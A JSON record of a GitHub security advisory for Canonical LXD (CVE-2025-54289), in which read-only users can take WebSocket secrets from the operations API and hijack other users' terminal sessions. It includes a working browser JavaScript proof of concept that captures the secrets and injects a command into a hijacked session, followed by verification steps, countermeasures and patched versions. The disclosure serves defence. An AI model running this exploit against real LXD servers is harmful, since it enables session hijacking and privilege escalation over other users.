{
  "Severity": "HIGH",
  "UpdatedAt": "2025-10-02T21:19:30Z",
  "Package": {
    "Ecosystem": "GO",
    "Name": "github.com/canonical/lxd"
  },
  "Advisory": {
    "DatabaseId": 314947,
    "Id": "GSA_kwCzR0hTQS0zZzcyLWNoajQtMjIyOM4ABM5D",
    "GhsaId": "GHSA-3g72-chj4-2228",
    "References": [
      {
        "Url": "https://github.com/canonical/lxd/security/advisories/GHSA-3g72-chj4-2228"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54289"
      },
      {
        "Url": "https://github.com/advisories/GHSA-3g72-chj4-2228"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-3g72-chj4-2228"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-54289"
      }
    ],
    "Description": "### Impact\nLXD's operations API includes secret values necessary for WebSocket connections when retrieving information about running operations. These secret values are used for authentication of WebSocket connections for terminal and console sessions.\n\nTherefore, attackers with only read permissions can use secret values obtained from the operations API to hijack terminal or console sessions opened by other users. Through this hijacking, attackers can execute arbitrary commands inside instances with the victim's privileges.\n\n### Reproduction Steps\n\n1. Log in to LXD-UI using an account with read-only permissions\n2. Open browser DevTools and execute the following JavaScript code\n\nNote that this JavaScript code uses the /1.0/events API to capture execution events for terminal startup, establishes a websocket connection with that secret, and sends touch /tmp/xxx to the data channel.\n\n```js\n(async () =\u003e {\nclass LXDEventsSession {\nconstructor(callback) {\nthis.wsBase =\n`wss://${window.location.host}/1.0/events?type=operation\u0026all-p\nrojects=true`;\nthis.eventsConn = new WebSocket(this.wsBase);\nthis.eventsConn.onopen = (event) =\u003e {\nconsole.log('Events conn Opened');\n};\nthis.eventsConn.onmessage = (event) =\u003e {\ncallback(event);\n};\n}}\nclass LXDWebSocketSession {\nconstructor(operationId, secrets) {\nthis.operationId = operationId;\nthis.secrets = secrets;\nthis.wsBase =\n`wss://${window.location.host}/1.0/operations/${operationId}/w\nebsocket`;\nthis.connections = {};\nthis.connections.data = new\nWebSocket(`${this.wsBase}?secret=${this.secrets['0']}`);\nthis.connections.data.onopen = (event) =\u003e {\nconsole.log('Data Opened');\nthis.connections.data.send(new\nTextEncoder().encode('touch /tmp/xxx\\r'));\n}\nthis.connections.data.onmessage = (event) =\u003e {\nconsole.log('[Data]', event.data);\n};\nthis.connections.control = new\nWebSocket(`${this.wsBase}?secret=${this.secrets.control}`);\nthis.connections.control.onopen = (event) =\u003e {\nconsole.log('Control Opened');\n}\nthis.connections.control.onmessage = (event) =\u003e {\nconsole.log('[Control]', event.data);\n};\n}\nclose() {\nObject.values(this.connections).forEach(ws =\u003e {\nif (ws.readyState === WebSocket.OPEN) {\nws.close();\n}\n});\n}\n}\nconst sessions = [];\nnew LXDEventsSession( (event) =\u003e {\nconst op = JSON.parse(event.data);\nconst opId = op.metadata.id;const secrets = op.metadata.metadata.fds;\nfor(const session of sessions){\nif(session.operationId === opId){\nreturn;\n}\n}\nsessions.push(new LXDWebSocketSession(opId, secrets))\n});\n})();\n```\n\n5. Have another user (or yourself for testing) start a terminal or console session on an instance\nAt this time, whoever uses the secret first gains session rights, so it's recommended to intentionally slow down communication speed using DevTools' bandwidth throttling feature for verification.\n6. Refresh the attacker's browser tab to stop event listening\n7. Have the victim reopen their terminal/console session and verify:\n\n```\n$ ls -la /tmp/xxx\n```\n\n### Risk\nAttack conditions require that the attacker has read permissions for the project, the victim (a user with higher privileges) opens a terminal or console session, and the attacker hijacks the WebSocket connection at the appropriate timing. Therefore, while successful attacks result in privilege escalation, the attack timing is very critical, making the realistic risk of attack relatively low.\n\n### Countermeasures\nAs a fundamental countermeasure, it is recommended to exclude WebSocket connection secret information from operations API responses for read-only users. In the current implementation, the operations API returns all operation information (including secret values) regardless of permission level, which violates the principle of least privilege.\n\nSpecifically, in lxd/operations.go, user permissions should be checked, and for users with read-only permissions, WebSocket-related secrets (fds field) should be excluded from operation metadata. This prevents attackers from obtaining secret values, making WebSocket connection hijacking impossible.\n\n### Patches\n\n| LXD Series  | Status |\n| ------------- | ------------- |\n| 6 | Fixed in LXD 6.5  |\n| 5.21 | Fixed in LXD 5.21.4  |\n| 5.0 | Ignored - Not critical |\n| 4.0  | Ignored - EOL and not critical |\n\n### References\nReported by GMO Flatt Security Inc.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-10-02T21:19:29Z",
    "Severity": "HIGH",
    "Summary": "Canonical LXD Vulnerable to Privilege Escalation via WebSocket Connection Hijacking in Operations API",
    "UpdatedAt": "2025-10-02T21:19:30Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 6.8,
      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "0.0.0-20250827065555-0494f5d47e41"
      },
      "VulnerableVersionRange": "\u003e= 0.0.0-20200331193331-03aab09f5b5c, \u003c 0.0.0-20250827065555-0494f5d47e41"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "6.5"
      },
      "VulnerableVersionRange": "\u003e= 6.0, \u003c 6.5"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "5.21.4"
      },
      "VulnerableVersionRange": "\u003e= 4.0, \u003c 5.21.4"
    }
  ]
}